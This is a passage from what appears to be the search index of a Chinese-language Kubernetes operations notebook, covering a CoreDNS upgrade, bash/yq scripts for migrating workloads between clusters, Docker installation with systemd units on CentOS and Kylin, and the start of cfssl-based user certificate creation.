&lt;none&gt;\npod/coredns-7b8886d7cd-k2jcf   1/1     Running   0          40s   172.20.2.3    k-kube-lab-03   &lt;none&gt;           &lt;none&gt;\n\nNAME               TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE   SELECTOR\nservice/kube-dns   ClusterIP   192.168.0.10   &lt;none&gt;        53/UDP,53/TCP,9153/TCP   12d   k8s-app=kube-dns\n\nNAME                      READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES                                         SELECTOR\ndeployment.apps/coredns   2/2     2            2           12d   coredns      hub.8ops.top/google_containers/coredns:1.8.6   k8s-app=kube-dns\n\nNAME                                 DESIRED   CURRENT   READY   AGE   CONTAINERS   IMAGES                                         SELECTOR\nreplicaset.apps/coredns-56745ff78    0         0         0       12d   coredns      hub.8ops.top/google_containers/coredns:1.8.4   k8s-app=kube-dns,pod-template-hash=56745ff78\nreplicaset.apps/coredns-7b8886d7cd   2         2         2       35m   coredns      hub.8ops.top/google_containers/coredns:1.8.6   k8s-app=kube-dns,pod-template-hash=7b8886d7cd\n</code></pre> <p>\u67e5\u770b\u96c6\u7fa4\u57fa\u7840\u7ec4\u4ef6\u8fd0\u884c</p> <pre><code>root@K-KUBE-LAB-01:/opt# kubectl -n kube-system get all\nNAME                                        READY   STATUS    RESTARTS      AGE\npod/coredns-56745ff78-8lf2v                 1/1     Running   0             107s\npod/coredns-56745ff78-xvjr8                 1/1     Running   0             107s\npod/etcd-k-kube-lab-01                      1/1     Running   0             9d\npod/etcd-k-kube-lab-02                      1/1     Running   0             29m\npod/etcd-k-kube-lab-03                      1/1     Running   0             29m\npod/kube-apiserver-k-kube-lab-01            1/1     Running   0             9d\npod/kube-apiserver-k-kube-lab-02            1/1     Running   0             29m\npod/kube-apiserver-k-kube-lab-03            1/1     Running   0             29m\npod/kube-controller-manager-k-kube-lab-01   1/1     Running   1 (29m ago)   9d\npod/kube-controller-manager-k-kube-lab-02   1/1     Running   0             28m\npod/kube-controller-manager-k-kube-lab-03   1/1     Running   0             28m\npod/kube-flannel-ds-g572q                   1/1     Running   0             12d\npod/kube-flannel-ds-hwgv2                   1/1     Running   0             12d\npod/kube-flannel-ds-l8lww                   1/1     Running   0             12d\npod/kube-flannel-ds-tbs8l                   1/1     Running   0             12d\npod/kube-flannel-ds-z9sjj                   1/1     Running   0             12d\npod/kube-proxy-8wgfl                        1/1     Running   0             9d\npod/kube-proxy-cdzmz                        1/1     Running   0             9d\npod/kube-proxy-m22z7                        1/1     Running   0             9d\npod/kube-proxy-r6pxx                        1/1     Running   0             9d\npod/kube-proxy-wpp72                        1/1     Running   0             9d\npod/kube-scheduler-k-kube-lab-01            1/1     Running   1 (29m ago)   9d\npod/kube-scheduler-k-kube-lab-02            1/1     Running   0             28m\npod/kube-scheduler-k-kube-lab-03            1/1     Running   0             28m\n\nNAME               TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE\nservice/kube-dns   ClusterIP   192.168.0.10   &lt;none&gt;        53/UDP,53/TCP,9153/TCP   12d\n\nNAME                             DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR            AGE\ndaemonset.apps/kube-flannel-ds   5         5         5       5            5           &lt;none&gt;                   12d\ndaemonset.apps/kube-proxy        5         5         5       5            5           kubernetes.io/os=linux   12d\n\nNAME                      READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/coredns   2/2     2            2           12d\n\nNAME                                 DESIRED   CURRENT   READY   AGE\nreplicaset.apps/coredns-56745ff78    2         2         2       12d\nreplicaset.apps/coredns-7b8886d7cd   0         0         0       23m\n</code></pre>"},{"location":"kubernetes/07-app-migrate/","title":"\u8fc1\u79fb\u5bb9\u5668","text":"<p>\u5728kubernetes cluster\u76f8\u8ddd\u8f83\u5927\u7248\u672c\u5347\u7ea7\u65f6\uff0c\u65e0\u6cd5\u76f4\u63a5\u8fdb\u884c\u5347\u7ea7\u3002\u8fd9\u65f6\u9700\u8981\u6211\u4eec\u65b0\u642d\u5efa\u5bb9\u5668\u7f16\u6392\u73af\u5883\uff0c\u518d\u8fdb\u884c\u5e94\u7528\u5bb9\u5668\u8fc1\u79fb\uff0c\u8fd9\u91cc\u5206\u4eab\u6211\u8fc1\u79fb\u7684\u4e00\u6b21\u8fc7\u7a0b\u3002</p>"},{"location":"kubernetes/07-app-migrate/#_2","title":"\u4e00\u3001\u6280\u672f\u53c2\u8003","text":"<p>\u63a8\u8350\u4f7f\u7528 yq</p> <pre><code>#!/bin/bash \n\nfor OBJ in $(kubectl api-resources --verbs=list --namespaced -o name)\ndo\n   for DEF in $(kubectl get --show-kind --ignore-not-found $OBJ -o name)\n   do\n      mkdir -p $(dirname $DEF)\n      kubectl get $DEF -o yaml \\\n      | yq eval '\n      del(\n        .metadata.resourceVersion, \n        .metadata.uid, \n        .metadata.annotations, \n        .metadata.creationTimestamp, \n        .metadata.selfLink, \n        .metadata.managedFields\n      )' - &gt; $DEF.yaml \n   done\ndone \n</code></pre> <p>\u5c06\u5bfc\u51fa\u7684yaml\u6587\u4ef6\u901a\u8fc7<code>kubectl apply -f</code>\u5e94\u7528\u81f3\u65b0\u7684kubernetes cluster\u7f16\u6392\u73af\u5883\u3002</p>"},{"location":"kubernetes/07-app-migrate/#_3","title":"\u4e8c\u3001\u5b9e\u6218\u64cd\u4f5c","text":""},{"location":"kubernetes/07-app-migrate/#21","title":"2.1 \u8bbe\u8ba1\u539f\u7406","text":"<ul> <li>\u5bfc\u51fa\u539f\u7f16\u6392\u73af\u5883\u7684\u8d44\u6e90\u5185\u5bb9</li> <li>\u8fdb\u884c\u76f8\u5e94\u6e05\u9664\u5904\u7406</li> <li>\u8fdb\u884c\u7248\u672c\u8fc7\u6e21\u5904\u7406</li> <li>\u5728\u65b0\u7f16\u6392\u73af\u5883\u5e94\u7528\u751f\u6548</li> <li>\u7ef4\u62a4\u65b0\u7f16\u6392\u73af\u5883</li> </ul>"},{"location":"kubernetes/07-app-migrate/#22","title":"2.2 \u5c55\u793a\u6e90\u7801","text":"<p>\u4e0b\u8f7d\u811a\u672c</p> <pre><code>#!/bin/bash\n\n[ `dirname $0` == \"./bin\" ] || exit 1\n\nexport PATH=\"`pwd`/bin\":$PATH\nkubectl_old=\"kubectl --kubeconfig=lib/kubeconfig-10.101.11.240\"\n# ${kubectl_old} api-resources --verbs=list --namespaced -o name \n\n#-----------------------------------------------------------------------------#\n# 11, secrets\nfunction do_secrets(){\n#${kubectl_old} label `${kubectl_old} get secrets -o name | awk '/tls-/' | paste -s -d ' '` 8ops.top=true\n\n${kubectl_old} get secrets -o name -l 8ops.top=true -o yaml | \\\n    yq eval '\n        del( \n            .items[].metadata.annotations, \n            .items[].metadata.creationTimestamp, \n            .items[].metadata.resourceVersion, \n            .items[].metadata.selfLink, \n            .items[].metadata.uid, \n            .metadata\n          )' - | \\\n    yq eval '\n        .items[].metadata.labels[\"8ops.top\"]=\"true\" | \n        .items[].metadata.namespace=\"kube-app\"\n        ' - &gt; 11-secrets.yaml\n}\n\n#-----------------------------------------------------------------------------#\n# 12, services\nfunction do_services(){\n#${kubectl_old} get services -l k8s-app=userdoor -o yaml | \\\n${kubectl_old} get services -l k8s-app -o yaml | \\\n    yq eval '\n        del( \n          .items[].metadata.annotations, \n            .items[].metadata.creationTimestamp, \n            .items[].metadata.resourceVersion, \n            .items[].metadata.selfLink, \n            .items[].metadata.uid, \n            .items[].spec.clusterIP,\n            .items[].spec.externalTrafficPolicy,\n            .items[].spec.sessionAffinity,\n            .items[].spec.ports[].nodePort,\n            .items[].status, \n            .metadata\n          )' - | \\\n    yq eval '\n      .items[].metadata.namespace=\"kube-app\" |\n      .items[].metadata.labels[\"8ops.top\"]=\"true\" |\n      .items[].spec.type=\"ClusterIP\"\n      ' - &gt; 12-services.yaml\n}\n\n#-----------------------------------------------------------------------------#\n# 13, deployments\nfunction do_deployments(){\n#${kubectl_old} get deployments -l k8s-app=userdoor -o yaml | \\\n${kubectl_old} get deployments -l k8s-app -o yaml | \\\n    yq eval '\n        del( \n            .items[].metadata.annotations, \n            .items[].metadata.creationTimestamp, \n            .items[].metadata.generation, \n            .items[].metadata.resourceVersion, \n            .items[].metadata.selfLink, \n            .items[].metadata.uid, \n            .items[].status, \n            .metadata \n          )' - | \\\n    yq eval '\n       .items[].metadata.namespace=\"kube-app\" | \n       .items[].metadata.labels[\"8ops.top\"]=\"true\" |\n       .items[].spec.replicas=0 |\n       .items[].apiVersion=\"apps/v1\" \n       ' - &gt; 13-deployments.yaml\n}\n\n#-----------------------------------------------------------------------------#\n# 14, ingresses\nfunction do_ingresses(){\n#${kubectl_old} label ing `${kubectl_old} get ing | awk '$2~/services.dev.ofc/{printf(\"%s \",$1)}'` 8ops.top/ingress.class=internal\n#${kubectl_old} label ing `${kubectl_old} get ing | awk '$2!~/services.dev.ofc/{printf(\"%s \",$1)}'` 8ops.top/ingress.class=external\n\n#${kubectl_old} get ingress -l k8s-app=a.example.com,8ops.top/ingress.class=external -o yaml | \\\n${kubectl_old} get ingress -l k8s-app,8ops.top/ingress.class=external -o yaml | \\\n    yq eval '\n        del( \n            .items[].metadata.annotations[\"kubernetes.io/ingress.class\"],  \n            .items[].metadata.annotations[\"kubectl.kubernetes.io/last-applied-configuration\"],\n            .items[].metadata.creationTimestamp, \n            .items[].metadata.generation, \n            .items[].metadata.resourceVersion, \n            .items[].metadata.selfLink, \n            .items[].metadata.uid, \n            .items[].status, \n            .metadata \n          )' - | \\\n    yq eval '\n        .items[].apiVersion=\"networking.k8s.io/v1\" |\n        .items[].metadata.namespace=\"kube-app\" |\n        .items[].metadata.labels[\"8ops.top\"]=\"true\" |\n        .items[].spec.ingressClassName=\"external\" \n        ' - | \\\n    sed \\\n        -e '/path:/a \\\n                pathType: Prefix' \\\n        -e 's/serviceName: /service: \\\n                    name: /g' \\\n        -e 's/servicePort: /  port: \\\n                      number: /g' &gt; 14-ingresses-external.yaml\n\n\n${kubectl_old} get ingress -l k8s-app,8ops.top/ingress.class=internal -o yaml | \\\n    yq eval '\n        del( \n            .items[].metadata.annotations[\"kubernetes.io/ingress.class\"],  \n            .items[].metadata.annotations[\"kubectl.kubernetes.io/last-applied-configuration\"],\n            .items[].metadata.creationTimestamp, \n            .items[].metadata.generation, \n            .items[].metadata.resourceVersion, \n            .items[].metadata.selfLink, \n            .items[].metadata.uid, \n            .items[].status, \n            .metadata \n          )' - | \\\n    yq eval '\n        .items[].apiVersion=\"networking.k8s.io/v1\" |\n        .items[].metadata.namespace=\"kube-app\" |\n        .items[].metadata.labels[\"8ops.top\"]=\"true\" |\n        .items[].spec.ingressClassName=\"internal\" \n        ' - | \\\n    sed \\\n        -e '/path:/a \\\n                pathType: Prefix' \\\n        -e 's/serviceName: /service: \\\n                    name: /g' \\\n        -e 's/servicePort: /  port: \\\n                      number: /g' &gt; 14-ingresses-internal.yaml\n}\n\n#-----------------------------------------------------------------------------#\n# 15, endpoints\nfunction do_endpoints(){\n${kubectl_old} get endpoints -l k8s-ep=custom-ep -o yaml | \\\n    yq eval '\n        del( \n            .items[].metadata.annotations, \n            .items[].metadata.creationTimestamp, \n            .items[].metadata.generation, \n            .items[].metadata.resourceVersion, \n            .items[].metadata.selfLink, \n            .items[].metadata.uid, \n            .items[].metadata.labels[\"k8s-ep\"], \n            .items[].status, \n            .metadata \n          )' - | \\\n    yq eval '\n      .items[].metadata.labels[\"8ops.top\"]=\"true\" |\n      .items[].metadata.labels[\"8ops.top/endpoints.custom\"]=\"true\" | \n      .items[].metadata.namespace=\"kube-app\" \n      ' - &gt; 15-endpoints.yaml\n\n}\n\n#-----------------------------------------------------------------------------#\n\n# dump\ndo_secrets\ndo_services\ndo_deployments\ndo_ingresses\ndo_endpoints\n\n# apply\nkubectl apply -f 11-secrets.yaml\nkubectl apply -f 12-services.yaml \nkubectl apply -f 13-deployments.yaml\nkubectl apply -f 14-ingresses-external.yaml\nkubectl apply -f 14-ingresses-internal.yaml\nkubectl apply -f 15-endpoints.yaml\n\nkubectl -n kube-app get deploy -o name | \\\nawk 'NR&gt;1{\n    printf(\"/usr/bin/kubectl -n kube-app scale --replicas=1 %s;\\n\",$1);\n    if(NR%3==0){printf(\"sleep 60;\\n\")}\n}' | sh\n\nexit 0\n</code></pre>"},{"location":"kubernetes/07-app-migrate/#23","title":"2.3 \u8ddf\u8fdb\u7ef4\u62a4","text":"<p>\u7531\u4e8e\u4e00\u6b21\u6027\u6267\u884c\u8fc7\u591a\u7684\u547d\u4ee4\u53bb\u521b\u5efa\u8d44\u6e90\u4f1a\u5bfc\u81f4kubernetes cluster\u5403\u4e0d\u6d88</p> <pre><code># \u67e5\u770b\u751f\u6548\u72b6\u6001\nkubectl -n kube-app get po | \\\n    awk 'NR&gt;1{S[$3]++}END{for(s in S)printf(\"%10s - %d\\n\",s,S[s])}'\n\n# \u5173\u95ed\u672a\u5c31\u4f4d\u7684\u5bb9\u5668\nkubectl -n kube-app scale --replicas=0 `kubectl -n kube-app get deploy | \\\n    awk 'NR&gt;1&amp;&amp;$3!=$4{printf(\"deploy/%s \",$1)}'` | \\\n    sh\n</code></pre>"},{"location":"kubernetes/07-app-migrate/#_4","title":"\u4e09\u3001\u756a\u5916\u7bc7","text":"<pre><code>#!/bin/bash\n\n###############################################################################\n#\n# Archive kubernetes's resource\n# @Jesse\n# 2023-04-13\n#\n###############################################################################\n\nset -e\n\nkubectl -n kube-app get configmap --field-selector metadata.name!=\"kube-root-ca.crt\" -o yaml | \\\n    yq eval '\n        del(\n        .items[].metadata.annotations,\n        .items[].metadata.creationTimestamp,\n        .items[].metadata.resourceVersion,\n        .items[].metadata.selfLink,\n        .items[].metadata.uid,\n        .metadata\n    )' - &gt; 10-archive-configmap.yaml\n\nkubectl -n kube-app get deployments -l k8s-app -o yaml | \\\n    yq eval '\n        del(\n        .items[].metadata.annotations,\n        .items[].metadata.creationTimestamp,\n        .items[].metadata.generation,\n        .items[].metadata.resourceVersion,\n        .items[].metadata.selfLink,\n        .items[].metadata.uid,\n        .items[].status,\n        .metadata\n    )' - &gt; 11-archive-deployments.yaml\n\nkubectl -n kube-app get services -o yaml | \\\n    yq eval '\n        del(\n        .items[].metadata.annotations,\n        .items[].metadata.creationTimestamp,\n        .items[].metadata.resourceVersion,\n        .items[].metadata.selfLink,\n        .items[].metadata.uid,\n        .items[].spec.clusterIP,\n        .items[].spec.externalTrafficPolicy,\n        .items[].spec.sessionAffinity,\n        .items[].status,\n        .metadata\n    )' - &gt; 12-archive-serices.yaml\n\n\nexit 0\n</code></pre>"},{"location":"kubernetes/08-docker/","title":"Docker","text":""},{"location":"kubernetes/08-docker/#_1","title":"\u4e00\u3001\u5e38\u7528\u6280\u5de7","text":""},{"location":"kubernetes/08-docker/#11-docker","title":"1.1 docker\u57fa\u7840\u955c\u50cf","text":"<ul> <li>Alpine</li> <li>Slim</li> <li>Stretch</li> <li>Buster</li> <li>Jessie</li> <li>Bullseye</li> <li>windowsservercore</li> </ul>"},{"location":"kubernetes/08-docker/#12","title":"1.2  \u5bb9\u5668\u968f\u673a\u542f\u52a8","text":"<pre><code># 1\uff0c\u5bb9\u5668\u542f\u52a8\u65f6\ndocker run --restart=\n  no           \u9ed8\u8ba4\u7b56\u7565\uff0c\u5728\u5bb9\u5668\u9000\u51fa\u65f6\u4e0d\u91cd\u542f\u5bb9\u5668\n  on-failure   \u5728\u7a97\u53e3\u975e\u6b63\u5e38\u9000\u51fa\u65f6\uff08\u9000\u51fa\u72b6\u6001\u975e0\uff09\uff0c\u624d\u4f1a\u91cd\u542f\u5bb9\u5668\n  on-failure:3 \u5728\u5bb9\u5668\u975e\u6b63\u5e38\u9000\u51fa\u65f6\u91cd\u542f\u5bb9\u5668\uff0c\u6700\u591a\u91cd\u542f3\u6b21\n  always       \u5728\u5bb9\u5668\u9000\u51fa\u65f6\u603b\u662f\u91cd\u542f\u5bb9\u5668\n\n# 2\uff0c\u5bb9\u5668\u8fd0\u884c\u4e2d\ndocker update --restart=always &lt;container id&gt;\n</code></pre>"},{"location":"kubernetes/08-docker/#13-centos","title":"1.3 Centos","text":"<pre><code># \u56fd\u5185\nyum install -y yum-utils\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n\nyum search docker-ce\nyum info docker-ce\nyum install docker-ce\n\nmkdir -p /srv/lib/docker\nln -s /srv/lib/docker /var/lib/docker\nsystemctl enable docker\nsystemctl is-enabled docker\nsystemctl start docker\nsystemctl status docker\n\nyum search docker-compose\nyum install -y docker-compose\n</code></pre>"},{"location":"kubernetes/08-docker/#14-docker-compose","title":"1.4 docker-compose","text":"<pre><code># down binary\n# from https://docs.docker.com/compose/install/standalone/\ncurl -SL https://github.com/docker/compose/releases/download/v2.23.3/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose\n\n# from epel\nyum install -y docker-compose\n</code></pre>"},{"location":"kubernetes/08-docker/#cri","title":"\u4e8c\u3001CRI","text":"docker ctr\uff08containerd\uff09 crictl\uff08kubernetes\uff09 \u67e5\u770b\u8fd0\u884c\u7684\u5bb9\u5668 docker ps ctr task ls/ctr container ls crictl ps \u67e5\u770b\u955c\u50cf docker images ctr image ls crictl images \u67e5\u770b\u5bb9\u5668\u65e5\u5fd7 docker logs \u65e0 crictl logs \u67e5\u770b\u5bb9\u5668\u6570\u636e\u4fe1\u606f docker inspect ctr container info crictl inspect \u67e5\u770b\u5bb9\u5668\u8d44\u6e90 docker stats \u65e0 crictl stats \u542f\u52a8/\u5173\u95ed\u5df2\u6709\u7684\u5bb9\u5668 docker start/stop ctr task start/kill crictl start/stop \u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u5bb9\u5668 docker run ctr run \u65e0\uff08\u6700\u5c0f\u5355\u5143\u4e3a pod\uff09 \u4fee\u6539\u955c\u50cf\u6807\u7b7e docker tag ctr image tag \u65e0 \u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5bb9\u5668 docker create ctr container create crictl create \u5bfc\u5165\u955c\u50cf docker load ctr image import \u65e0 \u5bfc\u51fa\u955c\u50cf docker save ctr image export \u65e0 \u5220\u9664\u5bb9\u5668 docker rm ctr container rm crictl rm \u5220\u9664\u955c\u50cf docker rmi ctr image rm crictl rmi \u62c9\u53d6\u955c\u50cf docker pull ctr image pull ctictl pull \u63a8\u9001\u955c\u50cf docker push ctr image push \u65e0 \u5728\u5bb9\u5668\u5185\u90e8\u6267\u884c\u547d\u4ee4 docker exec \u65e0 crictl exec"},{"location":"kubernetes/08-docker/#_2","title":"\u4e09\u3001\u94f6\u6cb3\u9e92\u9e9f","text":"<p>\u901a\u8fc7\u4e8c\u8fdb\u5236\u5b89\u88c5 docker</p> <p>\u901a\u8fc7\u5728\u7ebf\u8f6f\u4ef6\u6e90\u548c <code>rpm</code> \u5305\u4e0d\u80fd\u76f4\u63a5\u5b89\u88c5\uff0c\u90a3\u4e48\u53ea\u80fd\u9009\u62e9\u901a\u8fc7\u7f16\u8bd1\u5b89\u88c5\u4e86\uff0c\u53bb\u5b98\u7f51\u627e\u4e86\u4e0b\u53d1\u73b0\u63d0\u4f9b\u6709\u7f16\u8bd1\u597d\u7684 docker \u4e8c\u8fdb\u5236\u5305\uff0c\u76f4\u63a5\u4e0b\u8f7d\u4e8c\u8fdb\u5236\u5305\u5b89\u88c5\u5427\uff0c\u611f\u8c22 golang \u7684\u8de8\u5e73\u53f0\u6027\u3002</p>"},{"location":"kubernetes/08-docker/#31","title":"3.1 \u5b89\u88c5\u6761\u4ef6","text":"<ul> <li>**64\u4f4d**\u7684\u64cd\u4f5c\u7cfb\u7edf</li> </ul> <pre><code>shell\n\n# uname -p\naarch64\n</code></pre> <ul> <li>Linux \u5185\u6838\u7248\u672c <code>\u2265 3.10</code></li> </ul> <pre><code>shell\n\n# uname -r\n4.19.90-17.ky10.aarch64\n</code></pre> <ul> <li><code>iptables</code> \u7248\u672c <code>\u2265 1.4</code></li> </ul> <pre><code>shell\n\n# iptables --version\niptables v1.8.1 (legacy)\n</code></pre> <ul> <li>\u4e00\u4e2a <code>ps</code> \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u901a\u5e38\u7531 <code>procps</code> \u6216\u7c7b\u4f3c\u7684\u5305\u63d0\u4f9b\u3002</li> </ul>"},{"location":"kubernetes/08-docker/#32-docker-ce","title":"3.2 \u5b89\u88c5 Docker-ce","text":"<ol> <li>\u9009\u62e9\u5e76\u4e0b\u8f7d <code>docker-ce</code> \u4e8c\u8fdb\u5236\u5305\u6587\u4ef6</li> </ol> <p>\u5b98\u7f51\u4e0b\u8f7d\u5730\u5740\uff1ahttps://download.docker.com/linux/static/stable/aarch64/</p> <pre><code>shell\n\nwget https://download.docker.com/linux/static/stable/aarch64/docker-20.10.7.tgz\n</code></pre> <ol> <li>\u89e3\u538b\u4e0b\u8f7d\u597d\u7684\u538b\u7f29\u5305</li> </ol> <pre><code>shell\n\ntar -zxvf docker-20.10.7.tgz\n</code></pre> <ol> <li>\u79fb\u52a8\u89e3\u538b\u51fa\u6765\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5230 <code>/usr/bin</code> \u76ee\u5f55\u4e2d</li> </ol> <pre><code>shell\n\nmv docker/* /usr/bin/\n</code></pre> <ol> <li>\u6d4b\u8bd5\u542f\u52a8</li> </ol> <pre><code>shell\n\ndockerd\n</code></pre>"},{"location":"kubernetes/08-docker/#33-systemd","title":"3.3 \u6dfb\u52a0 systemd","text":"<ol> <li>\u6dfb\u52a0 docker \u7684 <code>systemd</code> \u670d\u52a1\u811a\u672c\u81f3 <code>/usr/lib/systemd/system/</code></li> </ol> <p>\u811a\u672c\u53c2\u8003\u81ea https://github.com/docker/docker-ce</p> <pre><code>/usr/lib/systemd/system/docker.service\n\n[Unit]\nDescription=Docker Application Container Engine\nDocumentation=https://docs.docker.com\nAfter=network-online.target docker.socket firewalld.service containerd.service\nWants=network-online.target\nRequires=docker.socket containerd.service\n\n[Service]\nType=notify\n# the default is not to use systemd for cgroups because the delegate issues still\n# exists and systemd currently does not support the cgroup feature set required\n# for containers run by docker\nExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock\nExecReload=/bin/kill -s HUP $MAINPID\nTimeoutStartSec=0\nRestartSec=2\nRestart=always\n\n# Note that StartLimit* options were moved from \"Service\" to \"Unit\" in systemd 229.\n# Both the old, and new location are accepted by systemd 229 and up, so using the old location\n# to make them work for either version of systemd.\nStartLimitBurst=3\n\n# Note that StartLimitInterval was renamed to StartLimitIntervalSec in systemd 230.\n# Both the old, and new name are accepted by systemd 230 and up, so using the old name to make\n# this option work for either version of systemd.\nStartLimitInterval=60s\n\n# Having non-zero Limit*s causes performance problems due to accounting overhead\n# in the kernel. We recommend using cgroups to do container-local accounting.\nLimitNOFILE=infinity\nLimitNPROC=infinity\nLimitCORE=infinity\n\n# Comment TasksMax if your systemd version does not support it.\n# Only systemd 226 and above support this option.\nTasksMax=infinity\n\n# set delegate yes so that systemd does not reset the cgroups of docker containers\nDelegate=yes\n\n# kill only the docker process, not all processes in the cgroup\nKillMode=process\nOOMScoreAdjust=-500\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <ol> <li>\u6839\u636e <code>docker.service</code> \u4e2d <code>Unit.After</code> \u9700\u6c42\u6dfb\u52a0 <code>docker.socket</code> \u811a\u672c\u81f3 <code>/usr/lib/systemd/system/</code></li> </ol> <p>\u811a\u672c\u53c2\u8003\u81ea https://github.com/docker/docker-ce</p> <pre><code>/usr/lib/systemd/system/docker.socket\n\n[Unit]\nDescription=Docker Socket for the API\n\n[Socket]\n# If /var/run is not implemented as a symlink to /run, you may need to\n# specify ListenStream=/var/run/docker.sock instead.\nListenStream=/run/docker.sock\nSocketMode=0660\nSocketUser=root\nSocketGroup=docker\n\n[Install]\nWantedBy=sockets.target\n</code></pre> <p>\u6ce8\u610f\uff1a\u5982\u679c\u7f3a\u5c11\u8be5\u6587\u4ef6\uff0c\u542f\u52a8 docker \u65f6\u4f1a\u62a5\u5982\u4e0b\u9519\u8bef\uff1a</p> <pre><code>shell\n\n# systemctl start docker\nFailed to start docker.service: Unit docker.socket not found.\n</code></pre> <ol> <li>\u6839\u636e <code>docker.service</code> \u4e2d <code>Unit.After</code> \u9700\u6c42\u6dfb\u52a0 <code>containerd.service</code> \u811a\u672c\u81f3 <code>/usr/lib/systemd/system/</code></li> </ol> <p>\u811a\u672c\u53c2\u8003\u81ea https://github.com/containerd/containerd</p> <pre><code>/usr/lib/systemd/system/containerd.service\n\n# Copyright The containerd Authors.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n[Unit]\nDescription=containerd container runtime\nDocumentation=https://containerd.io\nAfter=network.target local-fs.target\n\n[Service]\nExecStartPre=-/sbin/modprobe overlay\nExecStart=/usr/local/bin/containerd\n\nType=notify\nDelegate=yes\nKillMode=process\nRestart=always\nRestartSec=5\n# Having non-zero Limit*s causes performance problems due to accounting overhead\n# in the kernel. We recommend using cgroups to do container-local accounting.\nLimitNPROC=infinity\nLimitCORE=infinity\nLimitNOFILE=infinity\n# Comment TasksMax if your systemd version does not supports it.\n# Only systemd 226 and above support this version.\nTasksMax=infinity\nOOMScoreAdjust=-999\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>\u6ce8\u610f\uff1a\u5982\u679c\u7f3a\u5c11\u8be5\u6587\u4ef6\uff0c\u542f\u52a8 docker \u65f6\u4f1a\u62a5\u5982\u4e0b\u9519\u8bef\uff1a</p> <pre><code>shell\n\n# systemctl restart docker\nFailed to restart docker.service: Unit containerd.service not found.\n</code></pre> <ol> <li>\u91cd\u8f7d <code>systemd</code> \u914d\u7f6e\u6587\u4ef6</li> </ol> <pre><code>shell\n\nsystemctl daemon-reload\n</code></pre> <ol> <li>\u521b\u5efa docker \u7ec4</li> </ol> <pre><code>shell\n\ngroupadd docker\n</code></pre> <p>\u5982\u4e0d\u521b\u5efa docker \u7ec4\u5728\u901a\u8fc7 <code>systemctl</code> \u542f\u52a8\u65f6\u4f1a\u62a5\u9519\u5982\u4e0b</p> <pre><code>systemctl status docker\n\nDependency failed for Docker Application Container Engine.\nJob docker.service/start failed with result 'dependency'.\n</code></pre> <ol> <li>\u542f\u52a8 <code>docker</code> \u670d\u52a1</li> </ol> <pre><code>shell\n\nsystemctl start docker\nsystemctl enable docker\n</code></pre> <ol> <li> <p>\u4fee\u6539 docker \u914d\u7f6e\u6587\u4ef6\u5e76\u67e5\u770b\u5b89\u88c5\u597d\u7684 docker \u57fa\u672c\u4fe1\u606f</p> </li> <li> <p>\u5728 <code>/etc/docker/daemon.json</code> \u4e2d\u6dfb\u52a0\u5982\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>/etc/docker/daemon.json\n\n{\n    \"graph\": \"/data/docker\",\n    \"storage-driver\": \"overlay2\",\n    \"exec-opts\": [\n        \"native.cgroupdriver=systemd\"\n    ],\n    \"registry-mirrors\": [\n        \"https://t5t8q6wn.mirror.aliyuncs.com\"\n    ],\n    \"bip\": \"172.8.94.1/24\"\n}\n</code></pre> </li> <li> <p>\u91cd\u542f docker \u670d\u52a1</p> <pre><code>shell\n\nsystemctl restart docker\n</code></pre> </li> <li> <p>\u67e5\u770b docker info</p> </li> </ol>"},{"location":"kubernetes/08-docker/#_3","title":"\u56db\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"kubernetes/08-docker/#41","title":"4.1 \u4e0b\u8f7d","text":"<pre><code>vim /usr/lib/systemd/system/docker.service\n\n[Service]\n\nEnvironment=\"HTTP_PROXY=http://127.0.0.1:50081/\"\nEnvironment=\"HTTPS_PROXY=http://127.0.0.1:50081/\"\nEnvironment=\"NO_PROXY=localhost,127.0.0.1,.example.com\"\n\nsystemctl restart docker\n\ndocker pull mongo:7.0.12\n</code></pre>"},{"location":"kubernetes/09-account/","title":"\u7528\u6237\u4f53\u7cfb","text":"<p>\u521b\u5efatoken\uff0c\u7528\u4e8e</p> <ul> <li>dashboard\u767b\u5f55</li> <li>kubectl\u547d\u4ee4\u884c\u64cd\u4f5c</li> <li>\u8de8\u96c6\u7fa4\u7ba1\u7406</li> </ul> <p>\u591a\u96c6\u7fa4\u7ba1\u7406\u65b9\u5f0f</p>"},{"location":"kubernetes/09-account/#m1","title":"M1","text":"<pre><code>cat &gt; ca-config.json &lt;&lt;EOF\n{\n  \"signing\": {\n    \"default\": {\n      \"expiry\": \"87600h\"\n    },\n    \"profiles\": {\n      \"kubernetes\": {\n        \"usages\": [\n            \"signing\",\n            \"key encipherment\",\n            \"server auth\",\n            \"client auth\"\n        ],\n        \"expiry\": \"87600h\"\n      }\n    }\n  }\n}\nEOF\ncat &gt; demo-csr.json &lt;&lt;EOF\n{\n  \"CN\": \"demo\",\n  \"hosts\": [],\n  \"key\": {\n    \"algo\": \"rsa\",\n    \"size\": 2048\n  },\n  \"names\": [\n    {\n      \"C\": \"CN\",\n      \"ST\": \"Shanghai\",\n      \"L\": \"Shanghai\",\n      \"O\": \"Lab\",\n      \"OU\": \"System\"\n    }\n  ]\n}\nEOF\n\ncfssl gencert \\\n    -ca=/etc/kubernetes/pki/ca.crt \\\n    -ca-key=/etc/kubernetes/pki/ca.key \\\n    -config=ca-config.json \\\n    -profile=kubernetes \\\n    demo-csr.json | \\\n    cfssljson -bare 